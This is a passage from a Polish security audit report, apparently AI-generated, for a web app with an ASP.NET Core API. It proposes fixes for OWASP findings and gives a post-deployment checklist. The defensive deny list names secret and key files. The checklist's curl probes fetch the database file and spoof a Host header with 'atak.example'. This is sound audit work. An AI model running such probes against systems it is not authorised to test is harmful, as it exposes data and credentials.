        ".env",
        ".env.*",
        "*.{crt,pem,key,p12,pfx,cer,der}",
        ".npmrc",
        ".yarnrc.yml",
        "**/.git/**",
        // Baza i jej kopie z buduj_app_dev.ps1, logi tunelu, API, kontekst.
        "*.{db,db-wal,db-shm}",
        "**/src/Api/**",
        "**/.tunnel-run/**",
        "**/.claude/**",
        "**/context/**",
      ],
    },
  },
});
```

**Co się zmieniło:**
- F-001 (High, A02:2025): dodano `server.fs.deny` z domyślnymi wpisami Vite i katalogami spoza frontendu. Frontend nie importuje niczego spod `src/` (alias `~/` wskazuje na `app/`), więc blokada nie powinna niczego zepsuć. **Semantykę dopasowania wzorców (względem ścieżki bezwzględnej, `**/` dla wzorców bez `/`) sprawdź w dokumentacji `server.fs.deny` dla Vite 8** i potwierdź testem z sekcji 7 — to zabezpieczenie trzeba zweryfikować dynamicznie.
- Alternatywa bez ryzyka błędnego wzorca: wycofać tryb deweloperski z `start-tunnel.ps1` (skrypt odmawia startu) i wystawiać wyłącznie build produkcyjny.

---

### Plik: `src/Api/appsettings.json`

**Dotyczy znalezisk:** F-002

```json
  "AllowedHosts": "127.0.0.1;localhost"
```

**Co się zmieniło:**
- F-002 (High, A01/A02:2025): `HostFilteringMiddleware` (rejestrowany domyślnie przez `WebApplication`) odrzuca kodem 400 żądania z nagłówkiem `Host` spoza listy — strona po DNS rebindingu wysyła `Host: atak.example:5180` i zostaje odcięta. Wpisy nie zawierają portu, więc `Host: 127.0.0.1:5180` wysyłany przez `requestApi` przechodzi. Odpowiedź 400 z filtra przejdzie przez `UseStatusCodePages`, więc zostanie w kontrakcie błędów (`http_error`) — do potwierdzenia testem.
- Wymagana zmiana dokumentacji: dopisać czwarty warunek do komentarzy w `TreeIdentity.cs:23-39` i `AuthEndpoints.cs:187-197` („Kestrel przyjmuje wyłącznie `Host` pętli zwrotnej”) oraz do `lessons.md`.

---

### Plik: `src/Api/Program.cs` + `src/Api/Auth/AuthEndpoints.cs` + `src/Api/Errors/ApiError.cs`

**Dotyczy znalezisk:** F-003, F-004

```csharp
// src/Api/Program.cs — rejestracja limiterów (przed `var app = builder.Build();`)
using System.Threading.RateLimiting;
using Microsoft.AspNetCore.RateLimiting;

// F-003/F-004 (A07:2025, API4:2023): limity są GLOBALNE, a nie per IP — każde
// żądanie do API przychodzi z 127.0.0.1 (serwer React Routera), więc podział po
// adresie nic by tu nie dał. Globalny limit rejestracji jest bezpieczny, bo
// legalnych rejestracji jest kilka; globalny limit logowania jest wysoki,
// żeby atakujący nie mógł nim łatwo zablokować wszystkich (kompromis — sekcja 8).
builder.Services.AddRateLimiter(options =>
{
    options.AddFixedWindowLimiter(AuthRateLimits.RegisterPolicy, limiter =>
    {
        limiter.PermitLimit = 5;
        limiter.Window = TimeSpan.FromMinutes(10);
        limiter.QueueLimit = 0;
    });

    options.AddSlidingWindowLimiter(AuthRateLimits.LoginPolicy, limiter =>
    {
        limiter.PermitLimit = 30;
        limiter.Window = TimeSpan.FromMinutes(1);
        limiter.SegmentsPerWindow = 6;
        limiter.QueueLimit = 0;
    });

    // Odmowa w kontrakcie `{ error: { code, message, context } }` — bez tego
    // 429 wyszedłby przez UseStatusCodePages jako zbiorczy `http_error`.
    options.OnRejected = async (context, cancellationToken) =>
    {
        context.HttpContext.Response.StatusCode = StatusCodes.Status429TooManyRequests;
        await context.HttpContext.Response.WriteAsJsonAsync(
            ApiError.Create(
                ApiErrorCodes.RateLimited,
                "Zbyt wiele prób. Spróbuj ponownie za kilka minut."),
            cancellationToken);
    };
});

// ...

app.UseApiErrorContract();

// Po kontrakcie błędów, przed mapowaniem endpointów. WebApplication wstawia
// UseRouting na początku potoku sam, więc polityki per endpoint działają.
app.UseRateLimiter();
```

```csharp
// src/Api/Auth/AuthEndpoints.cs — przypięcie polityk do endpointów
    public static WebApplication MapAuthEndpoints(this WebApplication app)
    {
        // F-003: kod rejestracyjny jest jedyną barierą przed kontem — bez limitu
        // prób daje się zgadnąć skryptem przez publiczny adres tunelu.
        app.MapPost("/auth/register", RegisterAsync)
            .RequireRateLimiting(AuthRateLimits.RegisterPolicy);

        // F-004: blokada per konto nie chroni przed password sprayingiem.
        app.MapPost("/auth/login", LoginAsync)
            .RequireRateLimiting(AuthRateLimits.LoginPolicy);

        app.MapGet(SessionSigningKeyPath, GetSessionSigningKey);

        return app;
    }

/// <summary>Nazwy polityk ograniczania tempa ścieżek uwierzytelniania.</summary>
internal static class AuthRateLimits
{
    public const string RegisterPolicy = "auth-register";

    public const string LoginPolicy = "auth-login";
}
```

```csharp
// src/Api/Errors/ApiError.cs — w ApiErrorCodes; kod powstaje razem z emitentem
// (lessons.md, „Kontrakt API nie wyprzedza emitenta”)

    /// <summary>
    /// Odmowa z powodu przekroczenia limitu prób (429, <c>/auth/register</c>,
    /// <c>/auth/login</c>). <c>context</c> jest pusty.
    /// </summary>
    public const string RateLimited = "rate_limited";
```

```csharp
// src/Api/Auth/AuthSecrets.cs — minimalna długość kodu rejestracyjnego (F-003)

    /// <summary>
    /// Minimalna długość kodu rejestracyjnego. Kod jest jedyną barierą przed
    /// założeniem konta za publicznym tunelem; limit prób spowalnia zgadywanie,
    /// ale nie zastępuje entropii.
    /// </summary>
    public const int MinimumRegistrationCodeLength = 16;

    public IReadOnlyList<string> FindProblems()
    {
        var problems = new List<string>();

        if (string.IsNullOrWhiteSpace(RegistrationCode))
        {
            problems.Add(MissingMessage(RegistrationCodeKey));
        }
        else if (RegistrationCode.Length < MinimumRegistrationCodeLength)
        {
            // F-003 (A07:2025): wcześniej wystarczał dowolny niepusty kod.
            problems.Add(TooShortMessage(RegistrationCodeKey, MinimumRegistrationCodeLength));
        }

        if (string.IsNullOrWhiteSpace(SessionSigningKey))
        {
            problems.Add(MissingMessage(SessionSigningKeyKey));
        }
        else if (SessionSigningKey.Length < MinimumSessionSigningKeyLength)
        {
            problems.Add(TooShortMessage(SessionSigningKeyKey, MinimumSessionSigningKeyLength));
        }

        return problems;
    }

    // TooShortMessage uogólniony o klucz i próg; wywołanie w RequireSessionSigningKey
    // przekazuje (SessionSigningKeyKey, MinimumSessionSigningKeyLength).
    private static string TooShortMessage(string key, int minimumLength)
        => $"Wartość konfiguracji '{key}' jest krótsza niż {minimumLength} znaków.";
```

**Co się zmieniło:**
- F-003 (High, A07:2025/API4:2023): globalny limiter okna stałego na `/auth/register` i minimalna długość kodu sprawdzana przy starcie poza Development (po wdrożeniu start z dotychczasowym krótkim kodem zostanie przerwany — kod trzeba wcześniej wymienić).
- F-004 (Medium, A07:2025): globalny limiter przesuwny na `/auth/login`.
- Nowy kod błędu `rate_limited` — dodać test kształtu w `tests/Api.Tests` wzorem `AuthErrorContractTests`, a po stronie widoku obsłużyć 429 w formularzach (koperta przechodzi przez `requestAccount` bez zmian, bo `isApiErrorBody` ją przepuszcza).
- API rate limitera (`AddFixedWindowLimiter`, `AddSlidingWindowLimiter`, `OnRejected`, `RequireRateLimiting`) jest częścią shared framework ASP.NET Core od .NET 7 — bez nowych pakietów; wartości progów są propozycją.

---

### Plik: `app/lib/session.server.ts` + `app/lib/auth.server.ts`

**Dotyczy znalezisk:** F-005

```ts
// app/lib/session.server.ts

/**
 * Bezwzględny czas życia sesji. Ciasteczko pozostaje sesyjne (bez `maxAge`),
 * ale jego *wartość* przestaje być ważna po tym czasie — skopiowane ciasteczko
 * nie działa bezterminowo (F-005, A07:2025).
 */
export const SESSION_MAX_AGE_MS = 12 * 60 * 60 * 1000;

type SessionContent = {
  user: SessionUser;
  /** Chwila wydania sesji, ms od epoki — podpisana razem z tożsamością. */
  issuedAt: number;
};
```

```ts
// app/lib/auth.server.ts

export async function getUser(request: Request): Promise<SessionUser | null> {
  const storage = await findSessionStorage();

  if (storage === null) {
    return null;
  }

  const session = await storage.getSession(request.headers.get("Cookie"));
  const user = session.get("user");
  const issuedAt = session.get("issuedAt");

  // F-005: sesja bez czasu wydania (wystawiona przed tą zmianą) albo starsza
  // niż limit jest traktowana jak brak sesji — to samo bezpieczne zachowanie
  // co przy złym podpisie: formularz logowania.
  if (
    typeof issuedAt !== "number" ||
    Date.now() - issuedAt > SESSION_MAX_AGE_MS
  ) {
    return null;
  }

  return isSessionUser(user) ? user : null;
}

export async function createUserSession(
  user: SessionUser,
  redirectTo: string,
): Promise<Response> {
  const storage = await requireSessionStorage();
  const session = await storage.getSession();

  session.set("user", user);
  session.set("issuedAt", Date.now()); // F-005

  return redirect(redirectTo, {
    headers: { "Set-Cookie": await storage.commitSession(session) },
  });
}
```

**Co się zmieniło:**
- F-005 (Medium, A07:2025): znacznik `issuedAt` podpisany razem z tożsamością; `getUser` odrzuca sesje starsze niż 12 h (wartość do decyzji). Wdrożenie wyloguje wszystkie istniejące sesje (brak `issuedAt`) — zamierzone.
- Import `SESSION_MAX_AGE_MS` z `~/lib/session.server` w `auth.server.ts`.
- Unieważnienie przy wylogowaniu i blokadzie konta wymaga stanu po stronie API (np. „sesje ważne od” per konto, sprawdzane przez bramę) — rekomendacja w sekcji 8, bo zmienia kontrakt bramy.

---

### Plik: `src/Api/Screens/ScreenRules.cs`

**Dotyczy znalezisk:** F-006

```csharp
    /// <summary>
    /// Najwięcej kategorii na jednej liście — domyślnej ekranu i węzła.
    /// Wartość wymaga decyzji produktowej (PRD, Open Question 5); bez niej
    /// zapis ekranu materializuje węzły × K rekordów bez górnej granicy
    /// (F-006, API4:2023).
    /// </summary>
    internal const int MaxCategoriesPerList = 32;

    internal const string TooManyCategoriesMessage =
        "Lista może zawierać najwyżej 32 kategorie.";

    private static bool TryValidateCategoryList(
        IReadOnlyList<int> categoryIds,
        string missingMessage,
        string duplicateMessage,
        out string message)
    {
        if (categoryIds.Count == 0)
        {
            message = missingMessage;

            return false;
        }

        // F-006: górny limit przed sprawdzeniem powtórzeń — `Distinct` na
        // dowolnie długiej liście to też koszt, który płaci serwer.
        if (categoryIds.Count > MaxCategoriesPerList)
        {
            message = TooManyCategoriesMessage;

            return false;
        }

        if (categoryIds.Distinct().Count() != categoryIds.Count)
        {
            message = duplicateMessage;

            return false;
        }

        message = string.Empty;

        return true;
    }
```

**Co się zmieniło:**
- F-006 (Medium, API4:2023): przy 2000 węzłach i 32 kategoriach ekran ma najwyżej 64 000 przypisań. Limit działa i dla listy domyślnej, i dla listy węzła (obie idą przez `TryValidateCategoryList`). Dodać testy w `ScreenRulesTests`.
- Uzupełniająco (bez kodu tutaj): limit liczby drzew i ekranów na konto w `CreateTreeAsync`/`CreateScreenAsync` (odmowa 409 z nowym kodem, wzorem `tree_too_large`), limit liczby pozycji słownika oraz zastąpienie `LoadCatalogAsync` w zapisie obiektu zapytaniem po `NormalizedCode` (wzorem `CategoryEndpoints.cs`).

---

### Plik: `src/Api/Auth/AuthEndpoints.cs` + `app/lib/auth.server.ts`

**Dotyczy znalezisk:** F-007

```csharp
// src/Api/Auth/AuthEndpoints.cs — logowanie zdarzeń bezpieczeństwa (fragmenty)

    /// <summary>Kategoria logu zdarzeń uwierzytelniania.</summary>
    private const string SecurityLogCategory = "Api.Auth.Security";

    private static async Task<IResult> LoginAsync(
        LoginRequest? request,
        UserManager<AppUser> userManager,
        ILoggerFactory loggerFactory)
    {
        var log = loggerFactory.CreateLogger(SecurityLogCategory);
        // ... walidacja pól bez zmian ...

        if (!await userManager.CheckPasswordAsync(user, password))
        {
            await userManager.AccessFailedAsync(user);

            // F-007 (A09:2025): identyfikator konta, nigdy hasło. E-mail nie
            // trafia do logu — identyfikator wystarcza do korelacji.
            log.LogWarning("Nieudane logowanie. UserId={UserId}", user.Id);

            if (await userManager.IsLockedOutAsync(user))
            {
                log.LogWarning("Konto zablokowane po nieudanych próbach. UserId={UserId}", user.Id);
            }
            // ... odpowiedź bez zmian ...
        }
    }

    private static async Task<IResult> RegisterAsync(
        RegisterRequest? request,
        UserManager<AppUser> userManager,
        AuthSecrets secrets,
        ILoggerFactory loggerFactory)
    {
        // ...
        if (!FixedTimeMatches(secrets.RequireRegistrationCode(), registrationCode))
        {
            // F-007: sam fakt i długość — wartość kodu nigdy nie trafia do logu.
            loggerFactory.CreateLogger(SecurityLogCategory)
                .LogWarning("Odrzucony kod rejestracyjny. Length={Length}", registrationCode.Length);
            // ... odpowiedź bez zmian ...
        }
    }
```

```ts
// app/lib/auth.server.ts — w requireSameOrigin, przed `throw`
  if (origin === null || host === null || origin !== host) {
    // F-007: za tunelem każde żądanie przychodzi z 127.0.0.1; realny adres
    // klienta niesie nagłówek Cloudflare. Wiarygodny tylko dlatego, że serwer
    // słucha wyłącznie na pętli zwrotnej (HOST=127.0.0.1).
    console.warn(
      JSON.stringify({
        event: "origin_mismatch",
        origin: originHeader,
        host: hostHeader,
        client: request.headers.get("CF-Connecting-IP"),
      }),
    );

    throw Response.json(/* bez zmian */);
  }
```

**Co się zmieniło:**
- F-007 (Medium, A09:2025): wpisy `Warning` dla nieudanego logowania, blokady i złego kodu rejestracyjnego; wpis dla `origin_mismatch` z adresem klienta z Cloudflare. Zasada z `lessons.md`: żadnego sekretu, hasła ani kodu w logu. Parametr `ILoggerFactory` wstrzykiwany przez minimal API (klasa statyczna nie może być argumentem `ILogger<T>`).
- Log 429 z limiterów (F-003) — dopisać w `OnRejected`.

---

### Plik: `app/entry.server.tsx`

**Dotyczy znalezisk:** F-008

```tsx
/**
 * Nagłówki bezpieczeństwa dla każdej odpowiedzi HTML (F-008, A02:2025).
 * Zestaw minimalny, który nie psuje renderowania: bez `script-src`/`style-src`,
 * bo React Router wstawia skrypty inline, a antd i `root.tsx` style inline —
 * pełna polityka wymaga nonce (sekcja 8 raportu).
 */
const NAGLOWKI_BEZPIECZENSTWA: Record<string, string> = {
  "Content-Security-Policy":
    "frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'",
  "X-Frame-Options": "DENY",
  "X-Content-Type-Options": "nosniff",
  "Referrer-Policy": "same-origin",
  // Przeglądarka zawsze widzi HTTPS (TLS terminuje edge Cloudflare). Host
  // quick tunnelu zmienia się przy restarcie, więc bez includeSubDomains/preload.
  "Strict-Transport-Security": "max-age=31536000",
};

// ... w body.on("end", …):
            responseHeaders.set("Content-Type", "text/html");

            for (const [nazwa, wartosc] of Object.entries(NAGLOWKI_BEZPIECZENSTWA)) {
              responseHeaders.set(nazwa, wartosc);
            }
```

**Co się zmieniło:**
- F-008 (Medium, A02:2025): `frame-ancestors`/`X-Frame-Options` zamykają clickjacking, `form-action 'self'` ogranicza wysyłkę formularzy, `nosniff`, `Referrer-Policy` i HSTS domykają podstawowy zestaw. Nagłówki ustawiane obok istniejącego `Content-Type`, bez zmiany logiki `onAllReady` (kontrakt 2 z `CLAUDE.md` zostaje nietknięty). Odpowiedzi `.data` i tras zasobowych nie przechodzą przez `entry.server` — dla nich wystarczy `nosniff` (sekcja 8).

---

### Plik: `app/lib/api.server.ts` (i analogicznie `auth.server.ts`, `session.server.ts`, `routes/api.health.ts`)

**Dotyczy znalezisk:** F-009

```ts
  try {
    response = await fetch(`${API_BASE_URL}${path}`, {
      method,
      headers,
      body: payload === undefined ? undefined : JSON.stringify(payload),
    });
  } catch (cause) {
    // F-009 (A10:2025): przyczyna techniczna (adres, port, ECONNREFUSED) idzie
    // do logu serwera, nie do koperty — koperta trafia do danych strony.
    console.error(
      JSON.stringify({ event: "api_unreachable", path, reason: describeCause(cause) }),
    );

    return {
      ok: false,
      status: 502,
      error: apiError(
        ROUTE_ERROR_CODES.ApiUnreachable,
        "Nie udało się połączyć z API aplikacji.",
        { path },
      ),
    };
  }
```

**Co się zmieniło:**
- F-009 (Low): `reason` przeniesiony do logu. Ta sama zmiana w `requestAccount` (`auth.server.ts:202-211`), `fetchSigningKey` (`session.server.ts:148-152`) i `api.health.ts:32-41`; skrypty startowe sprawdzają wyłącznie status HTTP `/api/health`, więc nie tracą informacji.

---

### Plik: `src/Api/Data/DictionaryCode.cs`

**Dotyczy znalezisk:** F-010

```csharp
using System.Globalization;
using System.Text;

    /// <summary>
    /// Normalizacja kodu: NFKC, obcięcie spacji, wielkie litery niezależne od
    /// kultury. NFKC sprowadza warianty zgodności (np. pełnoszerokie litery) do
    /// postaci kanonicznej (F-010, A06:2025).
    /// </summary>
    internal static string Normalize(string code)
        => code.Normalize(NormalizationForm.FormKC).Trim().ToUpperInvariant();

    /// <summary>
    /// Czy kod zawiera znak sterujący albo formatujący (zero-width, bidi) —
    /// takiego kodu nie da się odróżnić wzrokiem od innego, więc walidacja
    /// obiektów i kategorii ma go odrzucić z komunikatem pola `code`.
    /// </summary>
    internal static bool ContainsInvisible(string code)
        => code.Any(c => CharUnicodeInfo.GetUnicodeCategory(c) is
            UnicodeCategory.Control or UnicodeCategory.Format);
```

**Co się zmieniło:**
- F-010 (Low): NFKC w normalizacji i nowa reguła odrzucenia znaków niewidocznych (wywołanie w walidacji kodu w `ObjectEndpoints`/`CategoryEndpoints`). Zmiana normalizacji dotyka istniejących wartości `NormalizedCode` — przed wdrożeniem sprawdzić, czy przeliczenie nie tworzy kolizji z indeksem unikalnym (migracja danych).

## 6. Wymagane zmiany infrastrukturalne

- **Tryb deweloperski tunelu (F-001):** do czasu weryfikacji blokady w `vite.config.ts` nie uruchamiać `start-tunnel.ps1` na maszynie z prawdziwą bazą; rozważyć usunięcie trybu z `run-tunel-app` i zostawienie wyłącznie `start-prod-tunnel.ps1`.
- **Przeglądarka na maszynie-serwerze (F-002):** do czasu wdrożenia `AllowedHosts` nie przeglądać obcych stron na maszynie, na której działa API; po wdrożeniu — rotacja `Auth:SessionSigningKey` jako higiena (jeśli istnieje podejrzenie wycieku).
- **Kod rejestracyjny (F-003):** wymienić na losowy ≥ 16 znaków (np. `openssl rand -base64 24`) w `user-secrets`/`Auth__RegistrationCode` przed wdrożeniem kontroli długości; rotować po każdej fali zaproszeń.
- **Logi (F-007):** kierować stdout obu procesów do plików z retencją (dziś `.tunnel-run/*.log` dla trybu produkcyjnego) i przeglądać wpisy `Warning` kategorii `Api.Auth.Security`.
- **Kopie bazy:** `treegrid-kopia-przed-*.db` z `buduj_app_dev.ps1` zawierają hashe haseł — trzymać je poza katalogiem projektu albo czyścić.
- **CI/CD:** brak pipeline'u (`CLAUDE.md`, „Znane luki”); gdy powstanie — `npm audit --omit=dev` i `dotnet list package --vulnerable` jako krok blokujący.

## 7. Checklist do weryfikacji po wdrożeniu

- [ ] **F-001 (dev tunnel):** z uruchomionym `npm run dev` wykonaj `curl -s -o /dev/null -w "%{http_code}" http://localhost:5173/src/Api/db/treegrid.db` — przed poprawką 200, po poprawce 403; to samo dla `/.tunnel-run/`, `/src/Api/appsettings.json`, `/package.json` (ten ostatni może zostać 200 — ocenić). Aplikacja w trybie dev nadal się renderuje.
- [ ] **F-002 (Host):** `curl -s -H "Host: atak.example" http://127.0.0.1:5180/health` → 400 w kopercie `{ error: … }`; `curl -s http://127.0.0.1:5180/health` → 200; logowanie przez aplikację działa (klucz podpisu pobierany z `Host: 127.0.0.1:5180`). **→ Erratum 1: oczekiwane jest 400 bez treści, nie w kopercie.**
- [ ] **F-003 (rejestracja):** 6 × szybko `POST /auth/register` ze złym kodem → 6. odpowiedź 429 z `code: "rate_limited"`; API w Production z kodem < 16 znaków odmawia startu z komunikatem nazywającym klucz (bez wartości).
- [ ] **F-004 (logowanie):** 31 × `POST /auth/login` w ciągu minuty → kolejne 429; blokada konta po 5 błędnych hasłach działa jak wcześniej.
- [ ] **F-005 (sesja):** zaloguj się, skopiuj `__session`, ustaw systemowo czas +13 h (albo tymczasowo obniż limit) → żądanie z tym ciasteczkiem trafia na `/logowanie`; sesja sprzed wdrożenia (bez `issuedAt`) wylogowuje.
- [ ] **F-006 (limity):** `POST /screens` z 33 kategoriami domyślnymi → 400 z komunikatem pola; 32 → 200; `dotnet test --filter "FullyQualifiedName~ScreenRulesTests"` przechodzi.
- [ ] **F-007 (logi):** błędne hasło → wpis `Warning` `Api.Auth.Security` z `UserId`, bez hasła i e-maila; żądanie z obcym `Origin` → wpis `origin_mismatch` z `client`.
- [ ] **F-008 (nagłówki):** `curl -sI https://<adres>.trycloudflare.com/logowanie` → obecne `Content-Security-Policy` z `frame-ancestors 'none'`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security`; kontrakt 2 z `CLAUDE.md` (offset `data-css-hash` < offset `</head>`) nadal spełniony.
- [ ] **F-009:** przy zgaszonym API `curl -s http://127.0.0.1:3000/api/health` → `context` bez `reason`; `reason` widoczny w logu serwera Node.
- [ ] **F-010:** utworzenie obiektu o kodzie `GPZ-01` + U+200B → 400; kod pełnoszerokimi literami koliduje z istniejącym → 409/400 duplikatu.
- [ ] **Negatywne testy autoryzacji (regresja):** jako użytkownik A wywołaj `GET /drzewo?drzewo=<id drzewa B>` i `GET /ekrany?ekran=<id ekranu B>` → brak danych B.
- [ ] **Dependency scan:** `npm audit --omit=dev` i `dotnet list src/Api package --vulnerable --include-transitive` → 0 podatności.
- [ ] **Secret scan:** `gitleaks detect` na repo → brak sekretów.
- [ ] **Regresja ogólna:** `npm run typecheck`, `dotnet test tests/Api.Tests`.

## 8. Rekomendacje długoterminowe

- **Pełny CSP z nonce** — `script-src 'nonce-…'` przez `nonce` w `<ServerRouter>`/`<Scripts>` React Routera oraz nonce dla stylów antd/`root.tsx` (sprawdź w dokumentacji React Router v8 i `@ant-design/cssinjs` obsługę nonce); dopiero wtedy CSP chroni przed XSS.
- **Unieważnianie sesji po stronie serwera (F-005, etap 2)** — znacznik „sesje ważne od” per konto w API, ustawiany przy wylogowaniu i blokadzie, sprawdzany przez bramę (`chronione.tsx`) przy każdym żądaniu; wymaga zmiany kontraktu bramy.
- **Limiter per klient po stronie Node** — `CF-Connecting-IP` jest wiarygodny wyłącznie dlatego, że serwer słucha na pętli zwrotnej za tunelem; limit per IP na `/logowanie` i `/rejestracja` zmniejsza ryzyko, że globalny limiter API z F-004 zostanie użyty do zablokowania logowania wszystkim.
- **Audyt zmian wspólnych słowników** — przekazywanie tożsamości do `/objects` i `/categories` i zapis autora zmian (F-007).
- **Złożony klucz obcy ekran→drzewo z właścicielem** i poprawka komentarza `Screen.cs:12-15` (F-011).
- **Testy hosta HTTP** (`WebApplicationFactory`) dla kontroli bezpieczeństwa: filtr `Host`, 429, kontrakt błędów, brak `reason` — dziś potok HTTP weryfikowany jest ręcznie (`CLAUDE.md`, „Znane luki”); zaplanować w ramach roadmapy, nie na zapas.
- **SAST i skan sekretów w CI** (Semgrep/CodeQL, gitleaks), gdy powstanie pipeline.
- **Dockerfile (F-012)** — `USER node`, przypięcie obrazu skrótem, rozszerzony `.dockerignore`, `packages.lock.json` dla NuGet — przy okazji przejścia na ścieżkę kontenerową (Fly.io jako runner-up).
- **Threat modeling (STRIDE)** przy każdej zmianie granic procesu (nowy port, nowa trasa zasobowa, nowy endpoint `/internal/*`).
- **Aktualizacja PRD** — Open Question 4 (usuwanie kategorii użytej w ekranie) jest rozstrzygnięta w planie `zapisane-ekrany` kaskadą, ale PRD nadal oznacza ją jako otwartą.

## 9. Źródła

- OWASP Top 10:2025 — https://owasp.org/Top10/
- OWASP API Security Top 10:2023 — https://owasp.org/API-Security/
  - API2:2023 Broken Authentication — https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/
  - API4:2023 Unrestricted Resource Consumption — https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/
  - API6:2023 Unrestricted Access to Sensitive Business Flows — https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/
  - API8:2023 Security Misconfiguration — https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
- OWASP Cheat Sheets — https://cheatsheetseries.owasp.org/
  - Authentication — https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  - Credential Stuffing Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html
  - Session Management — https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
  - HTTP Headers — https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
  - Content Security Policy — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
  - Clickjacking Defense — https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
  - Logging — https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
  - Denial of Service — https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
  - Password Storage — https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
  - Error Handling — https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
- CWE — https://cwe.mitre.org/
  - CWE-552 Files or Directories Accessible to External Parties (F-001) — https://cwe.mitre.org/data/definitions/552.html
  - CWE-346 Origin Validation Error (F-002) — https://cwe.mitre.org/data/definitions/346.html
  - CWE-307 Improper Restriction of Excessive Authentication Attempts (F-003, F-004) — https://cwe.mitre.org/data/definitions/307.html
  - CWE-613 Insufficient Session Expiration (F-005) — https://cwe.mitre.org/data/definitions/613.html
  - CWE-770 Allocation of Resources Without Limits or Throttling (F-006) — https://cwe.mitre.org/data/definitions/770.html
  - CWE-778 Insufficient Logging (F-007) — https://cwe.mitre.org/data/definitions/778.html
  - CWE-1021 Improper Restriction of Rendered UI Layers (F-008) — https://cwe.mitre.org/data/definitions/1021.html
  - CWE-209 Generation of Error Message Containing Sensitive Information (F-009) — https://cwe.mitre.org/data/definitions/209.html
  - CWE-1007 Insufficient Visual Distinction of Homoglyphs (F-010) — https://cwe.mitre.org/data/definitions/1007.html
- Vite — `server.fs.deny` — https://vite.dev/config/server-options.html#server-fs-deny
- ASP.NET Core — Host filtering, Rate limiting middleware — https://learn.microsoft.com/aspnet/core/fundamentals/servers/kestrel/host-filtering , https://learn.microsoft.com/aspnet/core/performance/rate-limit

---

*Raport wygenerowany przez Claude. Lista OWASP Top 10 zmienia się — przed dłuższym użyciem raportu zweryfikuj aktualność katalogów pod owasp.org. Ten audyt nie zastępuje audytu certyfikowanego pentestera ani audytu compliance (PCI-DSS, HIPAA, ISO 27001).*

---

## Dodatek A. Przebieg weryfikacji

### A.1 Fazy skilla i nadpisania przyjęte w zmianie `owasp-cr`

| Faza skilla | Co zrobiono | Nadpisanie względem `SKILL.md` |
|---|---|---|
| 1. Rozpoznanie zakresu | Typ: web SSR + wewnętrzne REST API; stack: React Router 8 (Node 24), ASP.NET Core / .NET 10, EF Core + SQLite, Cloudflare Quick Tunnel. Granice zaufania: przeglądarka → Node `127.0.0.1:3000` (za tunelem) → Kestrel `127.0.0.1:5180` → plik SQLite. Mapa tras i endpointów — A.4. | — |
| 2. Audyt | Kategoria po kategorii (A01–A10:2025, API1–API10:2023) w czterech obszarach: (a) uwierzytelnianie i sesja — agent główny; (b) słowniki obiektów i kategorii, (c) drzewa i ekrany, (d) konfiguracja i skrypty — trzy równoległe subagenty tylko do odczytu, zwracające kandydatów z `plik:linia`. Skan SCA — A.2. | Przegląd per obszar zrównoleglony (plan, „Implementation Approach”). |
| 3. Fixy | Każdy kandydat ponownie sprawdzony przez agenta głównego w kodzie; kod poprawek dla Medium+ (i dla Low, gdzie krótki) wyłącznie w sekcji 5. | **Kod repozytorium nie jest zmieniany** — decyzja z planu (`plan.md`, „What We're NOT Doing”). |
| 4. Raport | 9 sekcji szablonu `references/szablon-raportu.md` + ten dodatek. | Ścieżka: `context/changes/owasp-cr/raport.md` zamiast `/mnt/user-data/outputs/…`; brak `present_files`. |

**Załadowane referencje:** `owasp-web-top10-2025.md`, `owasp-api-top10-2023.md`, `przyklady-fixow.md`, `szablon-raportu.md`.
**Pominięte:** `owasp-llm-top10-2025.md` (brak integracji z LLM w kodzie aplikacji), `owasp-mobile-top10-2024.md` (brak aplikacji mobilnej; PRD: brak gwarancji dla ekranów mobilnych).

### A.2 Polecenia uruchomione i wyniki

| Polecenie | Wynik |
|---|---|
| `git status --porcelain` (przed i po skanach) | Identyczny: jedynie nieśledzone `.claude/skills/owasp-code-review/`, `.claude/skills/owasp-security/`, `context/changes/owasp-cr/` — skany niczego nie zmieniły. |
| `npm audit --omit=dev` | `found 0 vulnerabilities` |
| `npm audit` | `found 0 vulnerabilities` |
| `dotnet list src/Api package --vulnerable --include-transitive` | `The given project 'Api' has no vulnerable packages given the current sources.` (źródło: `https://api.nuget.org/v3/index.json`) |
| `dotnet list src/Api package` | `Microsoft.AspNetCore.Identity.EntityFrameworkCore`, `Microsoft.AspNetCore.OpenApi`, `Microsoft.EntityFrameworkCore.Design`, `Microsoft.EntityFrameworkCore.Sqlite` — wszystkie `10.0.12`, przypięte dokładnie. |
| `grep` po `package-lock.json` | `lockfileVersion: 3`, 293 wpisy `integrity`, 0 wpisów `resolved` po `http:`; `vite 8.3.0`, `@react-router/serve ^8.4.0`. |
| Środowisko | Node `v24.15.0`, npm `12.0.2`, .NET SDK `10.0.202`. W worktree audytu brak `node_modules` — zachowanie Vite 8.3.0 (F-001) sprawdzono w źródłach tej samej wersji pakietu z sąsiedniego checkoutu projektu (`vite/dist/node/chunks/node.js:17389-17459`, `:24532-24539`, `:24628-24638`). |
| `git log`/`git grep` po `appsettings*`, `.env*` i wzorcach sekretów (subagent d) | Wartości `Auth:*` puste we wszystkich 4 commitach dotykających `appsettings*.json`; trafienia `git grep` to wyłącznie nazwy pól formularzy. Wartości sekretów nie odczytywano. |
| `grep` po `app/`, `src/Api/` (bez migracji): nagłówki bezpieczeństwa, `AddRateLimiter`, `ILogger<`, `LogWarning`, `LogInformation` | 0 trafień (podstawa F-003, F-004, F-007, F-008). |
